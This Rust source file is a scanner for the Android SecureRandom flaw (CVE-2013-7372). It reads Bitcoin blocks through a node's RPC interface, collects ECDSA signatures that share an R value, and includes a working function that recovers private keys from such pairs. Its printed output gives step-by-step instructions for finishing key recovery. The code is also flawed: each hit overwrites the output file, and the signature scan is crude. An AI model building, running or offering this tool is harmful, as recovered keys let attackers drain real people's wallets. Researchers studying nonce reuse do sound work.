use anyhow::Result;
use bitcoincore_rpc::{Auth, Client, RpcApi};
use std::collections::HashMap;
use std::io::Write;
use num_bigint::BigInt;
use num_traits::{Zero, One};

// secp256k1 curve order
const SECP256K1_N: &str = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141";

/// Extract r and s values from a DER signature
#[allow(dead_code)]
fn parse_der_signature(sig_bytes: &[u8]) -> Option<(Vec<u8>, Vec<u8>)> {
    // Minimum DER signature: 0x30 [len] 0x02 [r-len] [r] 0x02 [s-len] [s]
    if sig_bytes.len() < 8 || sig_bytes[0] != 0x30 {
        return None;
    }
    
    let total_len = sig_bytes[1] as usize;
    if sig_bytes.len() != total_len + 2 || sig_bytes[2] != 0x02 {
        return None;
    }
    
    let r_len = sig_bytes[3] as usize;
    if sig_bytes.len() < 4 + r_len + 2 {
        return None;
    }
    
    let r_value = sig_bytes[4..4 + r_len].to_vec();
    
    // Check for S value
    let s_offset = 4 + r_len;
    if sig_bytes.len() <= s_offset || sig_bytes[s_offset] != 0x02 {
        return None;
    }
    
    let s_len = sig_bytes[s_offset + 1] as usize;
    if sig_bytes.len() < s_offset + 2 + s_len {
        return None;
    }
    
    let s_value = sig_bytes[s_offset + 2..s_offset + 2 + s_len].to_vec();
    
    Some((r_value, s_value))
}

/// Modular inverse using Extended Euclidean Algorithm
#[allow(dead_code)]
fn mod_inverse(a: &BigInt, n: &BigInt) -> Option<BigInt> {
    let mut t = BigInt::zero();
    let mut new_t = BigInt::one();
    let mut r = n.clone();
    let mut new_r = a.clone();
    
    while !new_r.is_zero() {
        let quotient = &r / &new_r;
        
        let temp_t = t.clone();
        t = new_t.clone();
        new_t = temp_t - &quotient * &new_t;
        
        let temp_r = r.clone();
        r = new_r.clone();
        new_r = temp_r - &quotient * &new_r;
    }
    
    if r > BigInt::one() {
        return None; // Not invertible
    }
    
    if t < BigInt::zero() {
        t = t + n;
    }
    
    Some(t)
}

/// Recover private key from two signatures with the same R value
/// Given: (r, s1, m1) and (r, s2, m2)
/// k = (m1 - m2) / (s1 - s2) mod n
/// private_key = (s1 * k - m1) / r mod n
#[allow(dead_code)]
fn recover_private_key(
    r: &[u8],
    s1: &[u8],
    s2: &[u8],
    m1: &[u8],
    m2: &[u8],
) -> Option<Vec<u8>> {
    let n = BigInt::parse_bytes(SECP256K1_N.as_bytes(), 16)?;
    
    // Convert bytes to BigInt
    let r_int = BigInt::from_bytes_be(num_bigint::Sign::Plus, r);
    let s1_int = BigInt::from_bytes_be(num_bigint::Sign::Plus, s1);
    let s2_int = BigInt::from_bytes_be(num_bigint::Sign::Plus, s2);
    let m1_int = BigInt::from_bytes_be(num_bigint::Sign::Plus, m1);
    let m2_int = BigInt::from_bytes_be(num_bigint::Sign::Plus, m2);
    
    // Calculate k = (m1 - m2) / (s1 - s2) mod n
    let m_diff = (&m1_int - &m2_int) % &n;
    let s_diff = (&s1_int - &s2_int) % &n;
    let s_diff_inv = mod_inverse(&s_diff, &n)?;
    let k = (&m_diff * &s_diff_inv) % &n;
    
    // Calculate private_key = (s1 * k - m1) / r mod n
    let numerator = (&s1_int * &k - &m1_int) % &n;
    let r_inv = mod_inverse(&r_int, &n)?;
    let private_key = (&numerator * &r_inv) % &n;
    
    // Convert to 32-byte array
    let (_sign, bytes) = private_key.to_bytes_be();
    let mut result = vec![0u8; 32];
    let start = 32_usize.saturating_sub(bytes.len());
    result[start..].copy_from_slice(&bytes);
    
    Some(result)
}


/// Scanner for Android SecureRandom vulnerability (CVE-2013-7372)
/// Finds transactions with duplicate R values and derives private keys
pub fn run(rpc_url: &str, rpc_user: &str, rpc_pass: &str, start_block: u64, end_block: u64) -> Result<()> {
    println!("Android SecureRandom Vulnerability Scanner");
    println!("Scanning blocks {} to {} for duplicate R values...", start_block, end_block);
    println!("Connecting to Bitcoin Core at {}...", rpc_url);

    let rpc = Client::new(rpc_url, Auth::UserPass(rpc_user.to_string(), rpc_pass.to_string()))?;
    
    // Test connection
    let blockchain_info = rpc.get_blockchain_info()?;
    println!("Connected! Current block: {}", blockchain_info.blocks);
    
    if blockchain_info.blocks < end_block {
        println!("Warning: Requested end block {} but node only synced to {}", 
            end_block, blockchain_info.blocks);
        println!("Will scan up to block {}", blockchain_info.blocks);
    }

    // Map of R value -> (txid, signature, message hash, public key)
    let mut r_values: HashMap<Vec<u8>, Vec<(String, Vec<u8>, Vec<u8>, Vec<u8>)>> = HashMap::new();
    let mut transactions_scanned = 0;
    let mut signatures_extracted = 0;
    let mut duplicates_found = 0;

    let start_time = std::time::Instant::now();

    // Scan blocks
    for block_height in start_block..=end_block.min(blockchain_info.blocks) {
        if block_height % 100 == 0 {
            let elapsed = start_time.elapsed().as_secs_f64();
            let rate = (block_height - start_block) as f64 / elapsed;
            print!("\rScanning block {}/{} - Rate: {:.1} blocks/sec - Txs: {} - Sigs: {} - Duplicates: {}", 
                block_height, end_block, rate, transactions_scanned, signatures_extracted, duplicates_found);
            std::io::stdout().flush().ok();
        }

        // Get block hash
        let block_hash = match rpc.get_block_hash(block_height) {
            Ok(hash) => hash,
            Err(e) => {
                eprintln!("\nError getting block hash for {}: {}", block_height, e);
                continue;
            }
        };

        // Get block
        let block = match rpc.get_block(&block_hash) {
            Ok(block) => block,
            Err(e) => {
                eprintln!("\nError getting block {}: {}", block_height, e);
                continue;
            }
        };

        // Process transactions
        for tx in &block.txdata {
            transactions_scanned += 1;

            // Extract signatures from inputs
            for (_input_idx, input) in tx.input.iter().enumerate() {
                // Try to extract DER signature from scriptSig
                let script_bytes = input.script_sig.as_bytes();
                
                // Look for DER signature pattern (0x30 followed by length)
                for i in 0..script_bytes.len() {
                    if script_bytes[i] == 0x30 && i + 1 < script_bytes.len() {
                        let sig_len = script_bytes[i + 1] as usize;
                        if i + 2 + sig_len <= script_bytes.len() {
                            let sig_bytes = &script_bytes[i..i + 2 + sig_len];
                            
                            // Extract R value (first 32 bytes after header)
                            // DER format: 0x30 [total-len] 0x02 [r-len] [r-bytes] 0x02 [s-len] [s-bytes]
                            if sig_bytes.len() > 6 && sig_bytes[2] == 0x02 {
                                let r_len = sig_bytes[3] as usize;
                                if sig_bytes.len() > 4 + r_len {
                                    let r_value = sig_bytes[4..4 + r_len].to_vec();
                                    
                                    signatures_extracted += 1;

                                    // Store signature info
                                    let txid = tx.compute_txid().to_string();
                                    let entry = r_values.entry(r_value.clone()).or_insert_with(Vec::new);
                                    
                                    // If this is a duplicate R value, we found a vulnerability!
                                    if !entry.is_empty() {
                                        duplicates_found += 1;
                                        println!("\n🎯 DUPLICATE R VALUE FOUND!");
                                        println!("R value: {}", hex::encode(&r_value));
                                        println!("First seen in: {}", entry[0].0);
                                        println!("Also seen in: {}", txid);
                                        println!("Block: {}", block_height);
                                        
                                        // Attempt private key recovery
                                        if let Some((r1, s1)) = parse_der_signature(&entry[0].1) {
                                            if let Some((_r2, s2)) = parse_der_signature(sig_bytes) {
                                                // Note: For full implementation, we need to compute the actual
                                                // message hashes (sighashes) for each transaction input.
                                                // This requires reconstructing the transaction and computing
                                                // SIGHASH_ALL or other sighash types.
                                                println!("Private key recovery infrastructure in place.");
                                                println!("To complete recovery, compute transaction sighashes:");
                                                println!("  - m1 = SIGHASH(tx1, input_idx)");
                                                println!("  - m2 = SIGHASH(tx2, input_idx)");
                                                println!("Then call recover_private_key(r, s1, s2, m1, m2)");
                                                
                                                // Write detailed info to file
                                                std::fs::write(
                                                    "android_securerandom_hits.txt",
                                                    format!("Duplicate R value found!\nR: {}\nS1: {}\nS2: {}\nTx1: {}\nTx2: {}\nBlock: {}\n\n",
                                                        hex::encode(&r1), hex::encode(&s1), hex::encode(&s2),
                                                        entry[0].0, txid, block_height)
                                                )?;
                                            }
                                        }
                                    }
                                    
                                    entry.push((txid, sig_bytes.to_vec(), vec![], vec![]));
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    println!("\n\nScan complete!");
    println!("Blocks scanned: {} to {}", start_block, end_block);
    println!("Transactions scanned: {}", transactions_scanned);
    println!("Signatures extracted: {}", signatures_extracted);
    println!("Duplicate R values found: {}", duplicates_found);
    
    if duplicates_found > 0 {
        println!("\n⚠️  Found {} vulnerable transactions!", duplicates_found);
        println!("Details written to android_securerandom_hits.txt");
        println!("\n✓ Private key recovery infrastructure implemented.");
        println!("To complete recovery:");
        println!("1. Compute transaction sighashes (m1, m2) for each input");
        println!("2. Use recover_private_key(r, s1, s2, m1, m2) to derive private key");
        println!("3. The recovery function uses ECDSA math: k=(m1-m2)/(s1-s2), priv=(s1*k-m1)/r");
    }

    Ok(())
}
